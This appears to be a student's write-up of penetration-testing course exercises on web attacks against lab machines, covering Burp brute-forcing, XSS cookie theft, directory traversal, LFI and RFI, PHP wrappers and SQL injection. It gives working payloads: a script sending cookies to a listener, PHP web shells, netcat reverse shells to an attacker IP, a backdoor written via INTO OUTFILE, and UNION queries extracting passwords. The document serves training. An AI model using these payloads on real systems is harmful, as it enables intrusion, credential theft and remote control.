# 9.5.2. Practice - Exploiting Admin Consoles
#### Exercises

_(To be performed on your own Kali and Windows 10 lab client machines - Reporting is required for these exercises)_

1.  Use Burp Intruder to gain access to the phpMyAdmin site running on your Windows 10 lab machine.

- We spot a phpmyadmin login portal located at the following URL `http://192.168.231.10/phpmyadmin/`
- In order to brute-force the login we must first capture the request in Burp Suite
![[burp_capture.png]]
- we then must set the correct payload variables and set the attack type to "Pitchforkl"![[pitchfork_brute.png]]
- Finally, we setup the payloads via the "Grep Extract" section in Intruder, capturing the response ![[grep_response.png]]
-  Once these steps are complete we can bruteforce the password 
![[Successful_bruteforce.png]]


2.  Insert a new user into the "users" table.
- Once logged in, creating a user is fairly simple. Start with navigating to the "User Accounts" tab
- Click the "Create New User" button
![[admin_user_add.png]]

# 9.6.6 Practice - XSS
#### Exercises

_(To be performed on your own Kali and Windows 10 lab client machines - Reporting is required for these exercises)_

1.  Exploit the XSS vulnerability in the sample application to get the admin cookie and hijack the session. Remember to use the PowerShell script on your Windows 10 lab machine to simulate the admin login.
- First must craft an XSS that was successfully steal the cookie of an administrator. We will setup a listener on port 80 and use the following snippet:
 `<script>new Image().src="http://IP.ADDRESS/cool.jpg?output="+document.cookie;</script>`
-  We then input this into the "Comments" section of the web form.
![[xss_document_cookie.png]]
- To test the validity of the XSS we then run the powershell script on the Windows machine
- We can see that the cookie was set to our listener, enabling us to adjust our cookie and hijack the admin's session
![[cookie_steal.png]]
![[session_hijack.png]]
2.  Consider what other ways an XSS vulnerability in this application might be used for attacks.
As this is a stored XSS there are numerous possible ways to exploit this XSS which would have severe implications on the server and its user's. Examples could include anything from defacing the web application to account compromise.

3.  Does this exploit attack the server or clients of the site?
As this is a stored XSS the server is on the recieving end. That being said, any user who visits the page is suseptable to attack.

# 9.7.2 Directory Traversal Vulnerabilities

## Practice - Directory Traversal Vulnerabilities

_(To be performed on your own Kali and Windows 10 lab client machines - Reporting is required for these exercises)_

1.  Exploit the directory traversal vulnerability to read arbitrary files on your Windows 10 lab machine.

This exploit only requires us to visit the following url:
`http://192.168.231.10/menu.php?file=current_menu.php`

From there we can edit the field after `menu.php?file=` to any file we wish to read, for example:
`http://192.168.231.10/menu.php?file=c:\windows\system32\drivers\etc\hosts`

# 9.8.5 LFI Code Execution

#### Exercises

_(To be performed on your own Kali and Windows 10 lab client machines - Reporting is required for these exercises)_

1.  Obtain code execution through the use of the LFI attack.
- First, we make a malicious request to the server, injecting a PHP function into the log file that will execute the OS command
`<?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';?>`
(note the `<pre>` tag meaning the line will be saved in its preformatted state, ignore breaks and spaces)

Here we can see the command being injected into this log file.
![[log_poisoning.png]]
- We then simply navigate to the vulnerable log file and call our newly injected function
`http://192.168.231.10/menu.php?file=c:\xampp\apache\logs\access.log&cmd=ipconfig`
![[lfi_log_ipconfig.png]]
2.  Use the code execution to obtain a full shell.
We can simply alter our URL to execute the following command:
`nc -e cmd.exe 192.168.119.231 9001`
After encoding, the full URL would resemble the following:
`http://192.168.231.10/menu.php?file=c:\xampp\apache\logs\access.log&cmd=nc%20-e%20cmd.exe%20192.168.119.231%209001`
![[log_lfi_revshell.png]]

# 9.8.7 Remote File Inclusion (RFI)

## Practice - Remote File Inclusion (RFI)

_(To be performed on your own Kali and Windows 10 lab client machines - Reporting is required for these exercises)_

1.  Exploit the RFI vulnerability in the web application and get a shell.
We start by creating a malicious script to be hosted on our local machine
![[rfi_malicious_file.png]]
We then setup a python server to serve this malicious file.
2.  Using /menu2.php?file=current_menu as a starting point, use RFI to get a shell.
From there we request this malicious file via the URL of the vulnerable web application 
![[lfi_whoami.png]]

3.  Use one of the webshells i
We can build on this by instead of issuing the command "whoami" we supply a url encoded reverse shell.
![[rfi_revshell.png]]

# 9.8.10 PHP wrappers
## Practice - PHP Wrappers

_(To be performed on your own Kali and Windows 10 lab client machines - Reporting is required for these exercises)_

1.  Exploit the LFI vulnerability using a PHP wrapper.
We simply append the php wrapper `file=data:text/plain,hello world` to the end of our url:
`http://192.168.231.10/menu.php?file=data:text/plain,hello%20world`

2.  Use a PHP wrapper to get a shell on your Windows 10 lab machine.
For this we replace the "hello world" at the end of our previous URL with a php script designed to execute code, we also place a reverse shell as our payload for the shell_exec to execute.
`<?php echo shell_exec("nc -e cmd.exe 192.168.119.231 9001") ?>`
![[shell_exec_revshell.png]]


# 9.9.4 SQL Injection - Authentication Bypass
#### Exercises

_(To be performed on your own Kali and Windows 10 lab client machines - Reporting is required for these exercises)_

1.  Interact with the MariaDB database and manually execute the commands required to authenticate to the application. Understand the vulnerability.
We can see that the malicious query is returning all user data, indicating that one of the "OR" arguments was satisfied. 
![[mariadb_query.png]]

2.  SQL inject the username field to bypass the login process.
A fairly similar username of "tom ' OR 1=1;#'" will bypass the login functionality.
![[username_sqli.png]]
3.  Why is the username displayed like it is in the web application once the authentication process is bypassed?
Because the web application is coded to reflect the entered username back to the user.
4.  Execute the SQL injection in the password field. Is the "LIMIT 1" necessary in the payload? Why or why not?
The limit arguement is used to specify the maximum amount of rows that will be returned. As this web application is using code that expects a single record to be returned we must use "LIMIT 1" in order to avoid errors.

# 9.9.9 Extracting Data
## Practice - Extracting Data from the Database

_(To be performed on your own Kali and Windows 10 lab client machines - Reporting is required for these exercises)_

1.  Enumerate the structure of the database using SQL injection.
We can enumerate the number of columns through trial and error via `union select all 1,2,...` 
![[sqli_column_error.png]]
![[slqi_columns.png]]
Once we understand the number of columns we are able to work with we can begin enumerating different aspects of the databse. For example:
version information
`http://10.11.0.22/debug.php?id=1 union all select 1, 2, @@version`
current user
`http://10.11.0.22/debug.php?id=1 union all select 1, 2, user()`
or a list of tables
`http://10.11.0.22/debug.php?id=1 union all select 1, 2, table_name from information_schema.tables`



2.  Understand how and why you can pull data from your injected commands and have it displayed on the screen.
The reason our malicious queries are being displayed on the screen has to do with the alignment of columns. By utilizing the correct amount of columns we are able to basically stick the data requested via our malicious query on to the currently outputted information, ignorning any errors as the columns are in alignment.

3.  Extract all users and associated passwords from the database.
The following url will extract usernames and passwords from the "users" table:
`http://10.11.0.22/debug.php?id=1 union all select 1, username, password from users`
![[sqli_passwords.png]]


# 9.9.11 From SQL Injection to Code Execution
## Practice - From SQL Injection to Code Execution

_(To be performed on your own Kali and Windows 10 lab client machines - Reporting is required for these exercises)_

1.  Exploit the SQL injection along with the MariaDB INTO OUTFILE function to obtain code execution.
To do this we simply need to append the end of our sql injection url, adding the creation of a malicious php file.
`http://10.11.0.22/debug.php?id=1 union all select 1, 2, "<?php echo shell_exec($_GET['cmd']);?>" into OUTFILE 'c:/xampp/htdocs/backdoor.php'`
This creates the new endpoint "backdoor.php" which allows us to specify a command to run via the arguement "cmd=". Here, we are running the ipconfig command.
![[sql_cmd_injection.png]]

2.  Turn the simple code execution into a full shell.
To gain a shell we simply replace our previous ipconfig command with a reverse shell.
![[sql_cmd_injection_ revshell.png]]


# 9.9.13 Automating SQL Injection
## Practice - Automating SQL Injection

_(To be performed on your own Kali and Windows 10 lab client machines - Reporting is required for these exercises)_

1.  Use sqlmap to obtain a full dump of the database.
Using SQLMap is fairly straightforward. We first need to supply the tool with the URL and the parameter to test.
`sqlmap -u http://10.11.0.22/debug.php?id=1 -p "id"`
From here we can quickly enumerate the databses:
`--dbs --dump` to output a list of databases, "dump" can be applied to multiple other queries
`-D Foo --tables` output a list of tables from the "Foo" database
`-D Foo -T bar --columns` output a list of columns from the "bar" table in "Foo" database
For this particular exercise we need to output the entire "webappdb" database which we can do with the following command:
`sqlmap -u http://192.168.157.10/debug.php?id=1 -p "id" -D webappdb --dump`
![[sqlmap_database.png]]

3.  Use sqlmap to obtain an interactive shell.
This is achieved by passing the "os-shell" arguement.
![[sqlmap_os_sheell.png]]